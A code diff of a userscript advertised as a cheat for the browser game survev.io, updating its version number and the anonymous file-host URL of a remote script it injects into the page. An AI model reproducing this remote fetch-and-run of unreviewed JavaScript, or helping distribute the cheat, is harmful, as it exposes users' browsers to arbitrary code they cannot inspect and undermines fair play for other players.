@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name         [V4] Duality Client
-// @version      4.0.3
+// @version      4.0.4
 // @description  The best survev.io cheat
 // @author       plazmascripts 
 // @run-at       document-start
@@ -11687,6 +11687,6 @@ else if (window.location.pathname === "/") {
 
 (function() {
     const script = document.createElement('script');
-    script.src = 'https://files.catbox.moe/d6v30e.js';
+    script.src = 'https://files.catbox.moe/jd4dfc.js';
     document.body.appendChild(script);
 })();
